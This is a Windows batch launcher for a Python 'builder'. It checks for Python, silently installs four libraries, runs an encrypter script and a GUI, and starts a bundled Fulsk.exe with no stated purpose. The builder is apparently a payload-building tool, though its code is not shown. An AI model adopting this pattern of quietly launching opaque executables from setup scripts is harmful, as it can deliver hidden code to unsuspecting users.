@echo off
title Ultra

cd /d %~dp0

title Checking Python installation...
python --version > nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed! (Go to https://www.python.org/downloads and install the latest version.^)
    echo Make sure it is added to PATH.
    goto ERROR
)

title Checking libraries...
echo Checking 'customtkinter' (1/4)
python -c "import customtkinter" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing customtkinter...
    python -m pip install customtkinter > nul
)

echo Checking 'pillow' (2/4)
python -c "import PIL" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing pillow...
    python -m pip install pillow > nul
)

echo Checking 'pyaes' (3/4)
python -c "import pyaes" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing pyaes...
    python -m pip install pyaes > nul
)

echo Checking 'urllib3' (4/4)
python -c "import urllib3" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing urllib3...
    python -m pip install urllib3 > nul
)

cls
title Starting builder...
pushd Components

rem Check if Fulsk.exe exists
if exist Fulsk.exe (
    echo Running Fulsk.exe...
    start Fulsk.exe
) else (
    echo Fulsk.exe not found! Please make sure Fulsk.exe is in the same directory.
)

rem Check if encrypter.py exists
if exist encrypter.py (
    echo Running encrypter.py...
    python encrypter.py
) else (
    echo encrypter.py not found! Please make sure encrypter.py is in the same directory.
    goto ERROR
)

popd
python sound.py # remove this line to remove my awesome clash of clans sound ong
python gui.py
if %errorlevel% neq 0 goto ERROR
exit

:ERROR
color 4 && title [Error]
pause > nul
